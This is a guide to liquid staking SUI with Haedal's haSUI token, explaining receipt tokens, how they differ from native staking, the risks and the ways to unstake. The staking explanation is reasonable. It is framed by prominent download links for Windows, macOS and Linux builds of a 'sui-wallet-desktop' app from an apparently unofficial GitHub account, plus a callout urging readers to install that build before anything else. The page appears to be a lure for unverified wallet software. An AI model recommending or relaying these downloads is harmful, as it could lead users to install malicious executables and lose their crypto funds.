![SUI Wallet](assets/banner-article.png)

# Liquid staking SUI with Haedal

Haedal returns a token for the stake, and that token can move while the stake stays delegated.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

Liquid staking swaps your SUI for a receipt token that keeps earning, so the stake and a spendable asset can
exist at the same time. Native staking locks the principal instead. The trade is real: the receipt token adds
smart-contract and liquidity risk that native staking does not have.

## What liquid staking is

Native staking commits SUI to a validator and the position stops being spendable. Liquid staking commits the same SUI through a protocol that issues a receipt token in return, a token whose value tracks the stake and its rewards over time.

You keep something you can hold, transfer or trade, and the underlying stake keeps earning. That is the whole
idea, and it is why the product exists: locked capital is capital nobody can use.
[Staking SUI in the wallet app](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/staking-sui-in-the-wallet-app.md) covers the native route, which is the comparison this page keeps
returning to.

## What the receipt token is

A receipt token is a claim on the protocol's pool rather than a claim on a particular validator. Its price is
not fixed at one SUI: as rewards accrue and are compounded into the pool, the redemption value per token
drifts upward.

That drift is why the token's number in your balance can look odd. One token is worth slightly more than one
SUI over time, so a balance of ten tokens and a balance of ten SUI are not the same amount of value.

## The four differences from native staking

Speed: a native position waits for the network's unstaking process, while a liquid position is sold on a market whenever somebody will buy it. Control: native staking names a validator, liquid staking delegates that choice to the protocol. Those four differences are the whole comparison between them.

Flexibility: a receipt token can be used elsewhere in the ecosystem while it earns. Risk: it adds a protocol,
a pool and a market between you and the underlying stake, and each of those can fail in its own way.

## What can go wrong

Three failures worth naming, because they are the ones native staking does not have. The protocol can have a
flaw in its contracts. The token can trade below its redemption value when sellers outnumber buyers. And the
redemption itself can be paused or queued during stress.

None of that makes liquid staking wrong; it makes it a different instrument. The question is not which pays
more this month, but which set of failures you can live with if the market turns.
[SUI staking APY explained](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/sui-staking-apy-explained.md) explains why comparing two advertised rates is weaker evidence than it
looks.

A fourth risk is quieter: the token can be accepted as collateral in lending markets, which turns a staking decision into a borrowing one. That is a separate trade with its own failure mode, and it is easy to enter by accident.

## Unstaking a receipt token

There are two routes back. Sell the token on a market, which is immediate and priced by whoever is buying, or redeem it through the protocol, which returns the underlying value on the protocol's own terms and may take longer.

The first can be cheaper or dearer than the second depending on the day, which is the point of having both.
Redeeming at a discount because you did not check the market is the avoidable mistake here.

## Is there a minimum?

No minimum is stated in these guides, and this page will not invent a number. What decides is the protocol's
own screen: it shows whether an amount is accepted before anything is signed, and that answer is the one that
counts.

The same rule applies to fees. The protocol sets them, the screen shows them, and the only check worth
trusting is the preview before the transaction is approved.

Read the fee line in the same preview. A protocol fee charged on a small amount can outweigh the yield the token earns in a month, which makes the arithmetic the deciding factor rather than the rate.

## Which wallet, and which release

The token is held in the same account as everything else, so the wallet needs nothing special to display it -
it is an object with an owner. Trading or redeeming happens on the protocol's own interface, connected to
this account.

The current release from the
[release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest) is what these
screens are described from, and the [repository](https://github.com/sui-blockchain-wallet/sui-wallet-desktop)
records the changes between builds. [Unstaking SUI and epoch timing](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/unstaking-sui-and-epoch-timing.md) covers the native side, where
the timing belongs to the network rather than to a protocol.

## FAQ

### What is liquid staking and what is haSUI?

Liquid staking commits SUI through a protocol that issues a receipt token, and haSUI is that receipt: a token
whose redemption value tracks the stake and its rewards rather than sitting at a fixed price.

### What is the difference between liquid and native staking?

Native staking locks the principal with a validator you choose. Liquid staking keeps a transferable token in
your hands, at the cost of adding a protocol, a pool and a market between you and the stake.

### How can I unstake a liquid staking token?

Sell it on a market for an immediate price, or redeem it through the protocol on the protocol's terms. Check
both before choosing, because the market price and the redemption value can differ.

### Is there a minimum amount required for liquid staking?

The protocol's screen decides, and it shows the answer before you approve anything. This page states no
figure, because the protocol's own limit is the one that applies.

### Does the receipt token earn while I hold it?

Yes. Rewards accrue to the pool and raise the token's redemption value, which is why holding it is not the
same as holding idle SUI.

### Can I lose money liquid staking?

Yes. A contract flaw, a token trading below its redemption value, or a paused redemption are all real, and
none of them exists in the native route.
